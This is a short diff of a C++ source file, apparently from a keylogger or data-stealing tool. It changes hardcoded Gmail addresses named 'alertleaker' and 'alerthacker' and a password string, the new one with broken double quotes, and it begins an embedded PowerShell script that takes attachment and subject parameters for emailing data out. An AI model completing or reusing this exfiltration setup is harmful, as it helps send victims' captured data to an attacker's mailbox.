@@ -11,9 +11,9 @@
 namespace Mail
 {
 
-    #define X_EM_TO "alertleaker01@gmail.com"
-    #define X_EM_FROM "alertleaker01@gmail.com"
-    #define X_EM_PASS "donotreadmypassword,Iknowyouarereadingit,onmygithubaccunt"
+    #define X_EM_TO "alerthacker1@gmail.com"
+    #define X_EM_FROM "alerthacker1@gmail.com"
+    #define X_EM_PASS ""donotreadmypassword,Iknowyouarereadingit,onmygithubaccunt""
 
 const std::string &PowerShellScript =
 "Param( #parameters to our script\r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
